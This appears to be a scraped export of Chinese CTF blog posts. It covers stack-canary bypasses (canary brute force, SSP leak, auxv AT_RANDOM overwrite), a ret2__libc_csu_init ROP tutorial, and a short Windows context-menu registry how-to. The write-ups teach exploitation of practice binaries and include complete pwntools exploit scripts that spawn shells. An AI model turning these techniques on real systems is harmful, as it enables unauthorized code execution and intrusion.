'/home/assassinq/pwn/ctf-wiki/canary/2017-NSCTF-pwn2/pwn2' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 开启了Canary。main 函数中看到只要每次回答Y，可以无限次地 fork 出新的进程： 123456789101112131415161718192021222324252627282930313233343536int __cdecl main()&#123; char v1; // [esp+1Bh] [ebp-5h] __pid_t pid; // [esp+1Ch] [ebp-4h] setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); while ( 1 ) &#123; write(1, \"[*] Do you love me?[Y]\\n\", 0x17u); if ( getchar() != 'Y' ) break; v1 = getchar(); while ( v1 != '\\n' &amp;&amp; v1 ) ; pid = fork(); if ( pid ) &#123; if ( pid &lt;= 0 ) &#123; if ( pid &lt; 0 ) exit(0); &#125; else // son &#123; wait(0); &#125; &#125; else // father &#123; func(); &#125; &#125; return 0;&#125; func()函数中存在buffer overflow，而且还存在format string，那这里其实是可以用这个漏洞泄漏出Canary的： 12345678910111213141516171819202122unsigned int func()&#123; char *s; // ST18_4 int buf; // [esp+1Ch] [ebp-1Ch] int v3; // [esp+20h] [ebp-18h] int v4; // [esp+24h] [ebp-14h] int v5; // [esp+28h] [ebp-10h] unsigned int v6; // [esp+2Ch] [ebp-Ch] v6 = __readgsdword(0x14u); buf = 0; v3 = 0; v4 = 0; v5 = 0; s = (char *)malloc(0x40u); input_name(&amp;buf); sprintf(s, \"[*] Welcome to the game %s\", &amp;buf); printf(s); puts(\"[*] Input Your Id:\"); read(0, &amp;buf, 0x100u); return __readgsdword(0x14u) ^ v6;&#125; Canary采用爆破的方法，libc 则可以用格式化字符串泄漏。放上逐字节爆破 exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'i386'p = process('./pwn2', env=&#123;'LD_RELOAD':'./libc.so.6_x86'&#125;)elf = ELF('./pwn2')libc = ELF('./libc.so.6_x86')system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))log.success('system_offset = ' + hex(system_offset))log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))libc_offset = 0x1b2000log.success('libc_offset = ' + hex(libc_offset))one_gadget_offset = 0x3af1clog.success('one_gadget_offset = ' + hex(one_gadget_offset))# gdb.attach(p)def forkNew(): p.sendlineafter('[Y]', 'Y')def inputName(name): p.recvuntil('[*] Input Your name please:') p.send(name)def inputId(Id): p.recvuntil('[*] Input Your Id:') p.send(Id)canary = '\\x00'for i in range(3): for j in range(256): # log.info('try ' + hex(j)) if i != 0 and j == 0: p.sendline('Y') else: forkNew() inputName('%12$p\\n') p.recvuntil('[*] Welcome to the game ') leak_addr = int(p.recv(10), 16) payload = 'A' * 16 payload += canary payload += chr(j) inputId(payload) p.recv() if 'smashing' not in p.recv(): canary += chr(j) log.info('At round %d find canary byte %#x' %(i, j)) breaklog.success('canary = ' + hex(u32(canary)))log.success('leak_addr = ' + hex(leak_addr))libc_base = leak_addr - libc_offsetlog.success('libc_base = ' + hex(libc_base))system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetone_gadget = libc_base + one_gadget_offsetlog.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))log.success('one_gadget = ' + hex(one_gadget))p.sendline('Y')inputName('AssassinQ\\n')payload = flat([ 'A' * 16, canary, 'B' * 12, one_gadget])inputId(payload)p.interactive() SSP（Stack Smashing Protect） Leak除了通过各种方法泄露Canary之外，我们还可以利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们get shell。但是当我们需要泄露的 flag 或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP（Stack Smashing Protect） Leak。 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (\"stack smashing detected\");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");&#125; JarvisOJ-Smashes1234567[*] '/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled 开了Canary，存在溢出但是没法泄漏： 123456789101112131415161718192021222324252627282930unsigned __int64 sub_4007E0()&#123; __int64 i; // rbx int c; // eax __int64 v3; // [rsp+0h] [rbp-128h] unsigned __int64 v4; // [rsp+108h] [rbp-20h] v4 = __readfsqword(0x28u); __printf_chk(1LL, \"Hello!\\nWhat's your name? \"); if ( !_IO_gets((__int64)&amp;v3) )LABEL_9: _exit(1); i = 0LL; __printf_chk(1LL, \"Nice to meet you, %s.\\nPlease overwrite the flag: \"); while ( 1 ) &#123; c = _IO_getc(stdin); if ( c == -1 ) goto LABEL_9; if ( c == '\\n' ) break; flag[i++] = c; if ( i == 32 ) goto LABEL_8; &#125; memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));LABEL_8: puts(\"Thank you, bye!\"); return __readfsqword(0x28u) ^ v4;&#125; 这里想到SSP Leak，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让Canary保护输出我们想要地址上的值： 123.rodata:000000000040094E ; char s[].rodata:000000000040094E s db &apos;Thank you, bye!&apos;,0 ; DATA XREF: sub_4007E0:loc_400878↑o.rodata:000000000040095E align 20h 尝试输出字符串 s： 1234567891011#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'p = remote('pwn.jarvisoj.com', 9877)test = 0x40094Ep.recvuntil('What\\'s your name?')p.sendline(p64(test) * 200)p.recvuntil('Please overwrite the flag:')p.sendline()p.recvall()p.interactive() 得到的结果果然泄漏出来了： 123[DEBUG] Received 0x4c bytes: 'Thank you, bye!\\n' '*** stack smashing detected ***: Thank you, bye! terminated\\n' 那么接下来需要做的就是找到存放 flag 的地址，在 ida 上找到是0x600d21，但是由于 main 函数中最后一句话memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));，在调用__stack_chk_fail()的时候，0x600d21上的值早就已经被覆盖成其它值了。通过 gdb 调试，发现在另一个地址也有 flag： 12345assassinq&gt;&gt; find &apos;CTF&apos;Searching for &apos;CTF&apos; in: None rangesFound 2 results, display max 2 items:smashes : 0x400d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;)smashes : 0x600d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;) 这里就涉及到了 elf 文件的重映射，当可执行文件足够小的时候，文件的不同区段可能会被多次映射： 123456789101112131415161718assassinq&gt;&gt; vmmapStart End Perm Name0x00400000 0x00401000 r-xp /home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes0x00600000 0x00601000 rw-p /home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fd7000 0x00007ffff7fda000 rw-p mapped0x00007ffff7ff7000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p mapped0x00007ffffffde000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] 那么 exp 如下： 123456789101112#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'p = remote('pwn.jarvisoj.com', 9877)test = 0x40094Eflag = 0x400d20p.recvuntil('What\\'s your name?')p.sendline(p64(flag) * 200)p.recvuntil('Please overwrite the flag:')p.sendline()p.recvall()p.interactive() Auxiliary Vector直接“挖”到 canary 产生的本源——AUXV(Auxiliary Vector)，并修改该结构体从而使 canary 值可控。 2017-TCTF-Final-upxof123456789λ checksec ./upxof[*] '/home/assassinq/Course_4/2017-TCTF-Final-upxof/upxof' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Packer: Packed with UPX 拖进 ida 里发现有壳，upx -d一下： 12345678910λ upx -d upxof Ultimate Packer for eXecutables Copyright (C) 1996 - 2013UPX 3.91 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Sep 30th 2013 File size Ratio Format Name -------------------- ------ ----------- ----------- 10116 &lt;- 6253 61.81% linux/ElfAMD upxofUnpacked 1 file. main 函数长这个样子，gets这里显然有一个溢出点： 12345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-410h] unsigned __int64 v5; // [rsp+408h] [rbp-8h] v5 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); printf(\"let's go:\", 0LL); gets(&amp;v4); return 0;&#125; 但是在尝试的时候发现这里有canary，疑惑地重新checksec一下，发现脱了壳变得不一样了： 1234567λ checksec ./upxof_no_upx[*] '/home/assassinq/Course_4/2017-TCTF-Final-upxof/upxof_no_upx' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 这里又不能泄漏，于是就需要用另一种方法来搞定canary，就是改变auxv结构体中的内容。auxv中包含了canary的地址，在动态链接之前就已经确定。（这篇文章讲得比较深入，还有phrack 上也有一篇文章） auxv结构可以在elf/elf.h里看到： 1234567891011121314151617181920212223242526272829/* Auxiliary vector. *//* This vector is normally only used by the program interpreter. The usual definition in an ABI supplement uses the name auxv_t. The vector is not usually defined in a standard &lt;elf.h&gt; file, but it can't hurt. We rename it to avoid conflicts. The sizes of these types are an arrangement between the exec server and the program interpreter, so we don't fully specify them here. */typedef struct&#123; uint32_t a_type; /* Entry type */ union &#123; uint32_t a_val; /* Integer value */ /* We use to have pointer elements added here. We cannot do that, though, since it does not work when using 32-bit definitions on 64-bit platforms and vice versa. */ &#125; a_un;&#125; Elf32_auxv_t;typedef struct&#123; uint64_t a_type; /* Entry type */ union &#123; uint64_t a_val; /* Integer value */ /* We use to have pointer elements added here. We cannot do that, though, since it does not work when using 32-bit definitions on 64-bit platforms and vice versa. */ &#125; a_un;&#125; Elf64_auxv_t; 自己写一个带有canary的程序，用 gdb 调一下，info auxv查看结构体的内容： 1234567891011121314151617181920assassinq&gt;&gt; info auxv33 AT_SYSINFO_EHDR System-supplied DSO&apos;s ELF header 0x7ffff7ffa00016 AT_HWCAP Machine-dependent CPU capability hints 0xf8bfbff6 AT_PAGESZ System page size 409617 AT_CLKTCK Frequency of times() 1003 AT_PHDR Program headers for program 0x4000404 AT_PHENT Size of program header entry 565 AT_PHNUM Number of program headers 97 AT_BASE Base address of interpreter 0x7ffff7dd70008 AT_FLAGS Flags 0x09 AT_ENTRY Entry point of program 0x4004a011 AT_UID Real user ID 100012 AT_EUID Effective user ID 100013 AT_GID Real group ID 100014 AT_EGID Effective group ID 100023 AT_SECURE Boolean, was exec setuid-like? 025 AT_RANDOM Address of 16 random bytes 0x7fffffffe0e931 AT_EXECFN File name of executable 0x7fffffffefc2 &quot;/home/assassinq/Course_4/2017-TCTF-Final-upxof/canary&quot;15 AT_PLATFORM String identifying platform 0x7fffffffe0f9 &quot;x86_64&quot;0 AT_NULL End of vector 0x0 经过了解，结构体中AT_RANDOM的值对应了canary的值（The value is a pointer to sixteen random bytes provided by the kernel. The dynamic linker uses this to implement a stack canary），可以测试一下： 1234assassinq&gt;&gt; x/gx 0x7fffffffe0e90x7fffffffe0e9: 0x47747e045c58c8d8assassinq&gt;&gt; canarycanary : 0x47747e045c58c800 还有比较重要的是，程序一开始AT_RANDOM、AT_EXECFN、AT_PLATFORM和其他的值都会被 push 到栈上： 12345678assassinq&gt;&gt; stack 1000...1280| 0x7fffffffe0b0 --&gt; 0x7fffffffe0e9 --&gt; 0x47747e045c58c8d81288| 0x7fffffffe0b8 --&gt; 0x1f1296| 0x7fffffffe0c0 --&gt; 0x7fffffffefc2 (&quot;/home/assassinq/Course_4/2017-TCTF-Final-upxof/canary&quot;)1304| 0x7fffffffe0c8 --&gt; 0xf1312| 0x7fffffffe0d0 --&gt; 0x7fffffffe0f9 --&gt; 0x34365f363878 (&apos;x86_64&apos;)... 可以searchmem一下看到存放canary的地方： 123456789assassinq&gt;&gt; searchmem 0x7fffffffe0e9Searching for &apos;0x7fffffffe0e9&apos; in: None rangesFound 1 results, display max 1 items:[stack] : 0x7fffffffe0b0 --&gt; 0x7fffffffe0e9 --&gt; 0x47747e045c58c8d8assassinq&gt;&gt; searchmem 0x47747e045c58c800Searching for &apos;0x47747e045c58c800&apos; in: None rangesFound 2 results, display max 2 items: mapped : 0x7ffff7fda728 --&gt; 0x47747e045c58c800[stack] : 0x7fffffffdc78 --&gt; 0x47747e045c58c800 最后基本上就可以知道canary的起源是如下的方式： 1kernel----&gt;AT_RANDOM----&gt;fs:[0x28]----&gt;canary 那么思路就分成了两步： 在程序还没有链接的时候把auxv的结构体覆盖，修改AT_RANDOM以设置canary为已知的值 接下来直接溢出做 ROP 或者直接跳到 shellcode 上 现在看来这个 upx 壳显然是有意义的。需要在没有被脱壳的情况下，没有被载入前覆盖掉auxv。第一次加载壳的时候可以输入长为0x4096的字符串，前八位则要求必须是12345678才能过 check。接下来解壳之后就可以溢出。 L4ys 大佬的 exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'amd64'p = process('./upxof')# gdb.attach(p, 'b *0x400a1c')p.recvuntil('password:')password = '12345678'payload = passwordpayload += p64(0) * 14payload += p64(1) # argcpayload += p64(0x400008) # argvpayload += p64(0)payload += p64(0x400008) * 39 # envppayload += p64(0)# aux vector# payload += p64(0x21)# payload += p64(0x7ffff7ffd000)# payload += p64(0x10) # AT_HWCAP# payload += p64(0x1f8bfbff)# payload += p64(0x6) # AT_PAGESZ# payload += p64(0x1000)# payload += p64(0x11) # AT_CLKTCK# payload += p64(0x64)payload += p64(0x3) # AT_PHDRpayload += p64(0x400040)# payload += p64(0x4) # AT_PHENT# payload += p64(0x38)payload += p64(0x5) # AT_PHNUMpayload += p64(0x2)# payload += p64(0x7) # AT_BASE# payload += p64(0x0)# payload += p64(0x8) # AT_FLAGS# payload += p64(0x0)payload += p64(0x9) # AT_ENTRYpayload += p64(0x400988)# payload += p64(0xb) # AT_UID# payload += p64(0x0)# payload += p64(0xc) # AT_EUID# payload += p64(0x0)# payload += p64(0xd) # AT_GID# payload += p64(0x0)# payload += p64(0xe) # AT_EGID# payload += p64(0x0)# payload += p64(0x17) # AT_SECURE# payload += p64(0x0)payload += p64(0x19) # AT_RANDOMpayload += p64(0x800008)# payload += p64(0x1f) # AT_EXECFN# payload += p64(0x7fffffffeff0) # --&gt; 0x666f7870752f2e ('./upxof')# payload += p64(0xf) # AT_PLATFORM# payload += p64(0x7fffffffe659) # --&gt; 0x34365f363878 ('x86_64')payload += p64(0)payload += p64(0)p.sendline(payload)p.recvuntil('go:')pop_rdi = 0x4007f3gets = 0x4005B0p.sendline(flat('\\x00' * 1048, pop_rdi, 0x00800000, gets, 0x00800000))p.sendline(asm(shellcraft.sh()))p.interactive() 参考网站https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/https://www.anquanke.com/post/id/85203https://bbs.ichunqiu.com/thread-44069-1-1.htmlhttps://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/https://www.jianshu.com/p/c3624f5dd583https://deadc0de.re/articles/microwave-write-up.htmlhttps://braddaniels.org/csaw-quals-2017-scv/https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/https://n132.github.io/2019/02/25/2019-03-01-auxv-origin-of-canaries/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"为Windows系统鼠标右键添加软件和图标","slug":"为Windows系统鼠标右键添加软件和图标","date":"2019-02-15T03:00:27.000Z","updated":"2019-08-26T05:52:25.162Z","comments":true,"path":"2019/02/15/为Windows系统鼠标右键添加软件和图标/","link":"","permalink":"blog.b3ale.cn/2019/02/15/为Windows系统鼠标右键添加软件和图标/","excerpt":"Windows 下不想要总是先打开软件，再把文件拖进去。那就可以修改一下右键菜单。","text":"Windows 下不想要总是先打开软件，再把文件拖进去。那就可以修改一下右键菜单。 修改文件右键菜单查壳还有调试的时候总是把文件拖来拖去实在太麻烦了，不如修改一下，直接右键就能开始分析。下面就记录一下修改文件右键菜单的过程： 首先打开注册表： 依次进入计算机\\HKEY_CLASSES_ROOT\\*\\shell，在shell项下新建一个项，这里以 PEID 为例。然后在新建好的PEID项下，新建字符串值，命名为Icon，并将其值修改为源文件的绝对路径（$PATH_TO_EXE）： 最后再在PEID项下新建项Command，修改其值为&quot;$PATH_TO_EXE&quot; &quot;%1&quot;： 成功后看一看效果： 修改空白处右键菜单在当前目录下打开cmd窗口太麻烦，不如也添加到右键菜单里： 首先同样打开注册表。进入计算机\\HKEY_CLASSES_ROOT\\Directory\\Background\\shell，新建项在此运行CMD，同以上一样新建字符串值Icon，并修改值： 在在此运行CMD下新建项Command，修改值为$PATH_TO_EXE，这里不需要双引号&quot;，也不需要%1： 看看效果： 参考网站https://blog.csdn.net/p312011150/article/details/81207059","categories":[],"tags":[{"name":"solution","slug":"solution","permalink":"blog.b3ale.cn/tags/solution/"}]},{"title":"中级ROP-ret2__libc_csu_init","slug":"中级ROP-ret2-libc-csu-init","date":"2019-02-12T10:02:50.000Z","updated":"2019-08-26T05:55:48.336Z","comments":true,"path":"2019/02/12/中级ROP-ret2-libc-csu-init/","link":"","permalink":"blog.b3ale.cn/2019/02/12/中级ROP-ret2-libc-csu-init/","excerpt":"用蒸米的一步一步学 ROP 之 linux_x64 篇中的 level5 来研究一下 64 位的 ROP。","text":"用蒸米的一步一步学 ROP 之 linux_x64 篇中的 level5 来研究一下 64 位的 ROP。 64 位的程序中，函数所调用的参数并不是全部在栈上，前六个参数分别位于rdi、rsi、rdx、rcx、r8和r9，其余参数则在栈上。同时，可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。所以 64 位的程序需要通过 rop 或者 libc 中的函数来设置参数。 分析程序程序给出的源码如下： 1234567891011121314#undef _FORTIFY_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, \"Hello, World\\n\", 13); vulnerable_function();&#125; 只开了 NX，那么vulnerable_function()中的栈溢出是很显然的： 123456[*] '/home/assassinq/pwn/ROP_STEP_BY_STEP/linux_x64/level5_ori/level5' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 没有任何可辅助的函数，同时也找不到可用的 gadgets 来用，这里就要用到 libc 中的一个函数__libc_csu_init()： 1234567891011121314151617181920212223242526272829303132333435363738.text:00000000004005A0 mov [rsp+var_28], rbp.text:00000000004005A5 mov [rsp+var_20], r12.text:00000000004005AA lea rbp, cs:600E24h.text:00000000004005B1 lea r12, cs:600E24h.text:00000000004005B8 mov [rsp+var_18], r13.text:00000000004005BD mov [rsp+var_10], r14.text:00000000004005C2 mov [rsp+var_8], r15.text:00000000004005C7 mov [rsp+var_30], rbx.text:00000000004005CC sub rsp, 38h.text:00000000004005D0 sub rbp, r12.text:00000000004005D3 mov r13d, edi.text:00000000004005D6 mov r14, rsi.text:00000000004005D9 sar rbp, 3.text:00000000004005DD mov r15, rdx.text:00000000004005E0 call _init_proc.text:00000000004005E5 test rbp, rbp.text:00000000004005E8 jz short loc_400606.text:00000000004005EA xor ebx, ebx.text:00000000004005EC nop dword ptr [rax+00h].text:00000000004005F0.text:00000000004005F0 loc_4005F0: ; CODE XREF: __libc_csu_init+64↓j.text:00000000004005F0 mov rdx, r15.text:00000000004005F3 mov rsi, r14.text:00000000004005F6 mov edi, r13d.text:00000000004005F9 call qword ptr [r12+rbx*8].text:00000000004005FD add rbx, 1.text:0000000000400601 cmp rbx, rbp.text:0000000000400604 jnz short loc_4005F0.text:0000000000400606.text:0000000000400606 loc_400606: ; CODE XREF: __libc_csu_init+48↑j.text:0000000000400606 mov rbx, [rsp+38h+var_30].text:000000000040060B mov rbp, [rsp+38h+var_28].text:0000000000400610 mov r12, [rsp+38h+var_20].text:0000000000400615 mov r13, [rsp+38h+var_18].text:000000000040061A mov r14, [rsp+38h+var_10].text:000000000040061F mov r15, [rsp+38h+var_8].text:0000000000400624 add rsp, 38h.text:0000000000400628 retn 可以看到在loc_4005F0之后，有对第三个参数rdx、第二个参数rsi以及第一个参数rdi的mov操作。同时如果合理设置r12和rbx的大小，我们能够做到call某个函数。尾巴上还有mov栈上的值到一些寄存器中，仔细观察可以发现这和之前的参数也有一些联系。构造出一个csu()的函数。因为在第二次跳转上去后，还有一次add rsp, 0x38，所以需要在栈上再补 56 个 byte： 1234567891011121314151617181920212223# 4005f0: 4c 89 fa mov rdx,r15# 4005f3: 4c 89 f6 mov rsi,r14# 4005f6: 44 89 ef mov edi,r13d# 4005f9: 41 ff 14 dc call QWORD PTR [r12+rbx*8]# 4005fd: 48 83 c3 01 add rbx,0x1# 400601: 48 39 eb cmp rbx,rbp# 400604: 75 ea jne 4005f0 &lt;__libc_csu_init+0x50&gt;# 400606: 48 8b 5c 24 08 mov rbx,QWORD PTR [rsp+0x8]# 40060b: 48 8b 6c 24 10 mov rbp,QWORD PTR [rsp+0x10]# 400610: 4c 8b 64 24 18 mov r12,QWORD PTR [rsp+0x18]# 400615: 4c 8b 6c 24 20 mov r13,QWORD PTR [rsp+0x20]# 40061a: 4c 8b 74 24 28 mov r14,QWORD PTR [rsp+0x28]# 40061f: 4c 8b 7c 24 30 mov r15,QWORD PTR [rsp+0x30]# 400624: 48 83 c4 38 add rsp,0x38# 400628: c3 retdef csu(rbx, rbp, r12, r13, r14, r15, ret_addr): # function = r12 # rdi = r13, rsi = r14, rdx = r15 payload = flat(['\\x00' * 136, 0x400606, 0, rbx, rbp, r12, r13, r14, r15, 0x4005f0, '\\x00' * 56, ret_addr]) # print repr(payload) p.recvuntil('Hello, World\\n') p.send(payload) sleep(1) 编写 exp然后接下来的主要分为三步。第一步泄漏出write()函数的地址，以获取 libc： 123456789101112131415# write(STDOUT_FILENO, write_got, 8);# r12 = write_got# rdi = 1, rsi = write_got, rdx = 8log.info('&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;')csu(0, 1, write_got, 1, write_got, 8, main)write = u64(p.recv(8).ljust(8, '\\x00'))log.success('write = ' + hex(write))libc = LibcSearcher('write', write)log.info('&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;')libc_base = write - libc.dump('write')system = libc_base + libc.dump('system')execve = libc_base + libc.dump('execve')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('execve = ' + hex(execve)) 这里对 libc 的泄漏同样也可以通过DynELF来爆破： 123456789def leak(address): csu(0, 1, write_got, 1, address, 8, main_addr) data = p.recv(8) return data# leak libclog.info('&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;')dynelf = DynELF(leak, elf=elf)system_addr = dynelf.lookup('system', 'libc') 拿到 libc 后可以获得system或者是execve的偏移。同时我们发现 bss 段可写，故接下来在 bss 段写入 system 的地址，以及字符串/bin/sh： 12345678# read(STDIN_FILENO, bss, 16)# r12 = read_got# rdi = 0, rsi = bss, rdx = 16log.info('&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;')csu(0, 1, read_got, 0, bss, 16, main)payload = flat([system, '/bin/sh\\x00'])p.send(payload)sleep(1) 最后一部只需要执行call已经写入的 system 并且将/bin/sh作为参数执行即可： 12345# execve(\"/bin/sh\"); or system(\"/bin/sh\");# r12 = execve/system# rdi = bss + 8 = \"/bin/sh\"log.info('&gt;&gt;&gt; EXECUTE execve(\"/bin/sh\") OR system(\"/bin/sh\") &lt;&lt;&lt;')csu(0, 1, bss, bss + 8, 0, 0, main) 整理一下，最后的 exp 如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *# context.log_level = 'debug'context.arch = 'amd64'p = process('./level5')# p = remote('127.0.0.1',10001)elf = ELF('./level5')write_got = elf.got['write']read_got = elf.got['read']main = elf.symbols['main']bss = elf.bss()log.success('write_got = ' + hex(write_got))log.success('read_got = ' + hex(read_got))log.success('main = ' + hex(main))log.success('bss = ' + hex(bss))# gdb.attach(p)# 4005f0: 4c 89 fa mov rdx,r15# 4005f3: 4c 89 f6 mov rsi,r14# 4005f6: 44 89 ef mov edi,r13d# 4005f9: 41 ff 14 dc call QWORD PTR [r12+rbx*8]# 4005fd: 48 83 c3 01 add rbx,0x1# 400601: 48 39 eb cmp rbx,rbp# 400604: 75 ea jne 4005f0 &lt;__libc_csu_init+0x50&gt;# 400606: 48 8b 5c 24 08 mov rbx,QWORD PTR [rsp+0x8]# 40060b: 48 8b 6c 24 10 mov rbp,QWORD PTR [rsp+0x10]# 400610: 4c 8b 64 24 18 mov r12,QWORD PTR [rsp+0x18]# 400615: 4c 8b 6c 24 20 mov r13,QWORD PTR [rsp+0x20]# 40061a: 4c 8b 74 24 28 mov r14,QWORD PTR [rsp+0x28]# 40061f: 4c 8b 7c 24 30 mov r15,QWORD PTR [rsp+0x30]# 400624: 48 83 c4 38 add rsp,0x38# 400628: c3 retdef csu(rbx, rbp, r12, r13, r14, r15, ret_addr): payload = flat(['\\x00' * 136, 0x400606, 0, rbx, rbp, r12, r13, r14, r15, 0x4005f0, '\\x00' * 56, ret_addr]) # print repr(payload) p.recvuntil('Hello, World\\n') p.send(payload) sleep(1)# rdi = edi = r13, rsi = r14, rdx = r15# write(STDOUT_FILENO, write_got, 8);# r12 = write_got# rdi = 1, rsi = write_got, rdx = 8log.info('&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;')csu(0, 1, write_got, 1, write_got, 8, main)write = u64(p.recv(8).ljust(8, '\\x00'))log.success('write = ' + hex(write))libc = LibcSearcher('write', write)log.info('&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;')libc_base = write - libc.dump('write')system = libc_base + libc.dump('system')execve = libc_base + libc.dump('execve')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('execve = ' + hex(execve))# read(STDIN_FILENO, bss, 16);# r12 = read_got# rdi = 0, rsi = bss, rdx = 16log.info('&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;')csu(0, 1, read_got, 0, bss, 16, main)payload = flat([system, '/bin/sh\\x00'])p.send(payload)sleep(1)# execve(\"/bin/sh\"); or system(\"/bin/sh\");# r12 = execve/system# rdi = bss + 8 = \"/bin/sh\"log.info('&gt;&gt;&gt; EXECUTE execve(\"/bin/sh\") OR system(\"/bin/sh\") &lt;&lt;&lt;')csu(0, 1, bss, bss + 8, 0, 0, main)log.info('&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;')p.interactive() 做题的时候遇到的一个小 bug 是当传的 payload 中的无意义字符如果不为\\x00，最后跑 system 会坏掉，但是 execve 不会影响。如果将 buf 填充为\\x00，才可以执行 system。具体原因还没有弄清楚。 以下再补充一点关于__libc_csu_init()的点，也就是隐藏 gadgets： 也是 libc 设计时的一个 bug，不同的偏移下，还能够得到pop rdi ; ret和pop rsi ; pop r15 ; ret两个 gadgets： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061assassinq&gt;&gt; x/5i 0x000000000040061A 0x40061a &lt;__libc_csu_init+90&gt;: pop rbx 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14assassinq&gt;&gt; x/5i 0x000000000040061B 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15assassinq&gt;&gt; x/5i 0x000000000040061C 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: retassassinq&gt;&gt; x/5i 0x000000000040061D 0x40061d 